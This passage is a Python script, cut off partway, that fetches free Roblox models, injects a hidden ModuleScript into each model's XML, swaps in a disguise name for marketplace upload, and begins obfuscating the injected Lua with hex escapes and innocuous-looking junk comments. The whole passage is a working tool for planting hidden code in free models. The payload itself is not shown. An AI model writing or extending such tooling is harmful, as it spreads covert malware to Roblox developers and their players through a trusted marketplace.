import requests
import random
import json
import re
from pathlib import Path

OPEN_CLOUD_BASE = "https://apis.roblox.com/assets/v1/assets"
ASSET_DELIVERY  = "https://assetdelivery.roblox.com/v1/asset/?id="

def fetch_donor_rbxmx(asset_id: int) -> str | None:
    """
    Pull a free model's raw rbxmx XML from Roblox asset delivery.
    No auth needed for free public assets.
    """
    r = requests.get(f"{ASSET_DELIVERY}{asset_id}", allow_redirects=True)
    if r.status_code != 200:
        print(f"  [!] Failed to fetch donor {asset_id}: {r.status_code}")
        return None
    return r.text

def inject_into_rbxmx(rbxmx: str, module_source: str, module_name: str) -> str:
    """
    Inject a hidden ModuleScript item into the donor rbxmx tree.
    Roblox loads all children — the injected module runs alongside
    the donor's existing scripts without touching them.
    """
    inject_block = f"""
  <Item class="ModuleScript" referent="ZBXINJECT01">
    <Properties>
      <string name="Name">{module_name}</string>
      <ProtectedString name="Source"><![CDATA[{module_source}]]></ProtectedString>
    </Properties>
  </Item>"""

    # Insert before closing </roblox> tag
    if "</roblox>" in rbxmx:
        return rbxmx.replace("</roblox>", inject_block + "\n</roblox>")

    # Fallback: append raw
    return rbxmx + inject_block

def mutate_name_in_rbxmx(rbxmx: str, new_name: str) -> str:
    """
    Replace the root Item's Name property so the uploaded model
    shows the disguise name in marketplace, not the donor's name.
    """
    # Replace first <string name="Name">...</string> occurrence
    return re.sub(
        r'(<string name="Name">)[^<]*(</string>)',
        rf'\g<1>{new_name}\g<2>',
        rbxmx,
        count=1
    )

def obfuscate_source(source: str) -> str:
    """
    Light string obfuscation on the injected Lua source:
    - wrap in a local function to avoid global leaks
    - rename obvious strings via hex escape substitution
    - add junk comment noise
    """
    junk_comments = [
        "-- cache preload v2",
        "-- spring util internal",
        "-- @deprecated use v3",
        "-- perf: lazy init
